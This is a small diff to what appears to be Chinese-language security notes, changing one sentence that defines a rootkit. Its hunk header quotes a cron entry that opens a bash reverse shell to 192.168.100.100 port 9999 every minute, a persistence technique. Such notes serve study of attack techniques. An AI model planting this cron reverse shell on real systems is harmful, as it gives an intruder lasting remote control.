@@ -68,7 +68,7 @@ echo '*/1 * * * * bash -c "bash -i &> /dev/tcp/192.168.100.100/9999 0>&1"' | cro
 
 ## rootkit
 
-rootkit 是隱藏其他程式的技術
+rootkit 是隱藏程式的技術
 
 ### Basic
 
